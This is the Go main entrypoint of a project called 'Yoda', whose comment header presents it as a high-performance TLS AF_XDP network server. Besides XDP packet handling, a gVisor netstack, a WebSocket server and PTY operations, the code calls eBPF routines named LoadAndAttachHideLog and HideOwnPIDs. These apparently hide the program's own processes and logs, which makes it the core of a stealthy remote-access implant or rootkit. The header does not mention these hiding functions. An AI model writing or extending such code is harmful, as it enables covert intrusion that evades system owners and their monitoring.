/*
Yoda TLS AF_XDP Network Server main entrypoint
Entrée principale du serveur réseau Yoda TLS AF_XDP

- Initializes eBPF/XDP components for high-performance packet processing
- Optimizes CPU affinity and NUMA topology for multi-core systems
- Launches dedicated goroutines for RX, TX, TLS, and PTY operations
- Handles graceful shutdown via signal management

- Initialise les composants eBPF/XDP pour le traitement performant des paquets
- Optimise l'affinité CPU et la topologie NUMA pour les systèmes multi-cœurs
- Lance des goroutines dédiées pour RX, TX, TLS et PTY
- Gère l'arrêt propre via la gestion des signaux
*/
package main

import (
	"log"
	"os"
	"os/signal"
	"syscall"

	cfg "github.com/cezamee/Yoda/internal/config"
	"github.com/cezamee/Yoda/internal/core"
	"github.com/cezamee/Yoda/internal/core/ebpf"

	"github.com/cilium/ebpf/rlimit"
)

func main() {
	// Remove memlock limit for eBPF usage
	// Supprime la limite memlock pour l'utilisation d'eBPF
	if err := rlimit.RemoveMemlock(); err != nil {
		log.Fatalf("Failed to remove memlock: %v", err)
	}

	// Initialize XDP components
	// Initialise les composants XDP
	coll, _, _, statsMap, cb, l, srcMAC, queueID := ebpf.InitializeXDP(cfg.InterfaceName)
	defer coll.Close()
	defer l.Close()

	// Create Gvisor netstack
	// Crée la netstack Gvisor
	netstackStack, linkEP := core.CreateNetstack()

	// Create bridge with correct structure
	// Crée le bridge avec la bonne structure
	bridge := &cfg.NetstackBridge{
		Cb:       cb,
		QueueID:  queueID,
		Stack:    netstackStack,
		LinkEP:   linkEP,
		StatsMap: statsMap,
		SrcMAC:   srcMAC,
	}

	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)

	go func() {
		core.StartPacketProcessing(bridge)
	}()

	go func() {
		core.SetupWebSocketServer(bridge)
	}()

	exit, err := ebpf.LoadAndAttachHideLog()
	if err != nil {
		log.Fatal(err)
	}
	defer ebpf.CloseLinks(exit)

	enter, exit, err := ebpf.HideOwnPIDs()
	if err != nil {
		log.Fatal(err)
	}
	defer ebpf.CloseLinks(enter, exit)

	<-c
}
